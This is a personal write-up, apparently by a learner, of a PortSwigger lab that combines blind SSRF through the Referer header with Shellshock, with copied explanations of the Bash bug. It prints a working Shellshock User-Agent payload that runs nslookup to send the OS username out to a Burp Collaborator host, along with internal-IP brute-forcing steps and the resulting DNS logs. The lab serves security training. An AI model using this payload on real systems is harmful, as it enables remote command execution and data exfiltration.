教學
https://chowdera.com/2021/10/20211024023404011T.html

https://www.gushiciku.cn/pl/pno2/zh-tw

優先閱讀
https://blog.csdn.net/weixin_43263451/article/details/120624292


shellshock 簡單知識
https://www.796t.com/article.php?id=195292



```

This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded.

To solve the lab, use this functionality to perform a [blind SSRF](https://portswigger.net/web-security/ssrf/blind) attack against an internal server in the `192.168.0.X` range on port 8080. In the blind attack, use a Shellshock payload against the internal server to exfiltrate the name of the OS user.

#### Note

To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.




該站點使用分析軟件，該軟件在加載產品頁面時獲取Referer 標頭中指定的URL。

為了解決實驗室問題，使用此功能對 192.168.0.X 範圍內的內部服務器的 8080 端口執行盲 SSRF 攻擊。在盲攻擊中，對內部服務器使用 Shellshock 有效負載以洩露操作系統的名稱 用戶。
筆記

為了防止 Academy 平台被用於攻擊第三方，我們的防火牆阻止了實驗室與任意外部系統之間的交互。 要解決實驗室，您必須使用 Burp Collaborator 的默認公共服務器。





```


這題:
間單來說就是 使用 BP 外掛 collaborator everywhere 

找到目標網站，選擇target -> add to scope  ( 確認有打勾 )

接著這個網站所有 http 表頭都會被換成不同的 黑客dns 網址。

只要該網站有把其中一個表頭拿去請求，dns log 伺服器就會記錄下來。

回到sitemap 中得 issue 欄位可以看到 collaborator everywhere 所記錄到的訊息。

這題，可以看到 ssrf 的地方有  UA 和 Refer 

根據題目所說，shell shock payload 放在UA 的原因是:

```
HTTP协议的头User-Agent通常是保存在环境变量HTTP_USER_AGENT的

shellshock的payload：() { :; }; /usr/bin/nslookup whoami.YOUR-SUBDOMAIN-HERE.burpcollaborator.net

YOUR-SUBDOMAIN-HERE就是刚才Burp Collaborator client生成的域名，该payload可以将whoami的信息带外出来
————————————————
版权声明：本文为CSDN博主「浔阳江头夜送客丶」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
原文链接：https://blog.csdn.net/weixin_43263451/article/details/120624292


```

```

Bash 4.3以及之前的版本在处理某些特殊构造的环境变量时存在安全漏洞，向函数环境变量值后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行任意的shell命令,甚至完全控制目标系统

受到该漏洞影响的bash使用的环境变量是通过函数名称来调用的，以“(){”开头通过环境变量来定义的。而bash在处理这样的“函数环境变量”的时候，并没有以函数结尾“}”为结束，而是一直执行其后的shell命令

比如下面先定义了个特殊构造的“函数环境变量”（正确定义函数变量应该是foo='(){函数代码};'），然后执行bash后就会自动执行foo环境变量函数后面那块
————————————————
版权声明：本文为CSDN博主「浔阳江头夜送客丶」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
原文链接：https://blog.csdn.net/weixin_43263451/article/details/120624292

```





shellshock payload 格式 payload 功能 會帶出主機名
```
() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN
```


burp collaborator client 生成一個  dns server 網址
```
v51jmmpv3y90trs3g8os1bh4avgl4a.burpcollaborator.net
```


替換User-Agent::
```
User-Agent: () { :; }; /usr/bin/nslookup $(whoami).v51jmmpv3y90trs3g8os1bh4avgl4a.burpcollaborator.net
```


refer 頭使用 intuder 爆破。1-255
```
Refer: http://192.168.0.X
```



爆破完後，可以去 burp collaborator client  查看 dns log有兩筆
```
The Collaborator server received a DNS lookup of type A for the domain name 

peter-g5lhod.v51jmmpv3y90trs3g8os1bh4avgl4a.burpcollaborator.net.  

The lookup was received from IP address 3.251.95.143 at 2022-10.-11 04:35:04 UTC.

```

```
The Collaborator server received a DNS lookup of type A for the domain name 

peter-g5lhod.v51jmmpv3y90trs3g8os1bh4avgl4a.burpcollaborator.net.  The lookup was 

received from IP address 3.248.186.35 at 2022-10.-11 04:35:04 UTC.
```

有兩筆的原因可能是 類似於 cmd ping 127.0.0.1 會有四次封包，而這邊送出了2次


如果還想確認內網主機是哪一台 192.168.0.x 可能要再 payload 功能改成顯示出 ifconfig 之類的訊息


主機名 
```
peter-g5lhod
```


提交就會成功
